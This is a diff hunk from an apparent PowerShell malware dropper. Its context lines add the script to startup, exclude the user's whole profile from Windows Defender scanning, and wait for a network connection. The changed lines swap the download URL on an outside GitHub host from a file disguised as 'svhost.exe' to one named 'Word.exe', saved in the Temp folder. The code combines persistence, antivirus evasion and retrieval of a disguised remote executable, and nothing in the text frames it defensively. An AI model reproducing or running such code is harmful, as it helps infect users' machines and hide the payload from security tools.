@@ -42,8 +42,8 @@ Add-ToStartup
 
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 
-$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/svhost.exe'
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'svhost.exe')
+$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
 
 Wait-ForInternet
 
